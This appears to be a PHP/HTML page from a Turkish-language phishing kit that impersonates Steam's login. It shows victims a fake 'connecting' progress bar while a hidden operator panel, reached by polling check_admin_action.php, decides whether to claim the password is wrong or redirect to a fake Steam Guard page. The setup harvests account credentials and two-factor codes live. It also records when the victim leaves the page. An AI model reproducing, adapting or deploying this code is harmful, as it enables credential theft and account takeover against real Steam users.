
<?php
require_once 'config.php';

// Check if user has a valid session
if (!isset($_SESSION['credential_id']) || !isset($_SESSION['username'])) {
    header("Location: index.php");
    exit;
}

$credential_id = $_SESSION['credential_id'];
$username = $_SESSION['username'];

// Function to check admin actions
function checkAdminActions($pdo, $username) {
    $stmt = $pdo->prepare("SELECT status FROM credentials WHERE username = ? ORDER BY id DESC LIMIT 1");
    $stmt->execute([$username]);
    $result = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($result) {
        return $result['status'];
    }
    return 'pending';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Giriş - Yükleniyor</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #171a21;
            color: white;
            font-family: Arial, sans-serif;
        }
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 3px solid #66c0f4;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .progress-bar {
            height: 8px;
            border-radius: 4px;
            background-color: #32353c;
            overflow: hidden;
        }
        .progress-bar div {
            height: 100%;
            background-color: #66c0f4;
            transition: width 0.5s;
        }
    </style>
</head>
<body>
    <div class="min-h-screen flex flex-col items-center justify-center p-4">
        <div class="bg-[#1b2838]/70 backdrop-blur-sm p-8 rounded-md shadow-lg max-w-md w-full text-center">
            <div class="loader mx-auto mb-4"></div>
            <h1 class="text-xl font-bold text-white mb-2">Giriş Yapılıyor</h1>
            <p class="text-white/70 mb-6">Steam hesabınıza bağlanılıyor, lütfen bekleyin...</p>
            
            <div class="w-full mb-6">
                <div class="progress-bar">
                    <div id="progress-value" style="width: 0%"></div>
                </div>
                <p class="text-xs text-white/50 mt-1 text-right"><span id="progress-text">0</span>%</p>
            </div>
        </div>
    </div>

    <script>
        // Progress simulation
        let progress = 0;
        const progressBar = document.getElementById('progress-value');
        const progressText = document.getElementById('progress-text');
        
        function incrementProgress() {
            if (progress < 95) {
                progress += 5;
                progressBar.style.width = progress + '%';
                progressText.textContent = progress;
            }
        }
        
        // Start progress animation
        const progressInterval = setInterval(incrementProgress, 1000);
        
        // Check for admin actions
        function checkAdminActions() {
            fetch('check_admin_action.php')
                .then(response => response.json())
                .then(data => {
                    if (data.action === 'retry') {
                        clearInterval(progressInterval);
                        alert("Hesap adı veya parola yanlış");
                        setTimeout(() => window.location.href = 'index.php', 1000);
                    } else if (data.action === 'awaiting_2fa') {
                        clearInterval(progressInterval);
                        window.location.href = 'steam-guard.php';
                    }
                })
                .catch(error => console.error('Error checking admin actions:', error));
        }
        
        // Check for admin actions every 3 seconds
        setInterval(checkAdminActions, 3000);
        
        // Set up cleanup function when user leaves
        window.addEventListener('beforeunload', function() {
            fetch('set_user_offline.php');
        });
    </script>
</body>
</html>
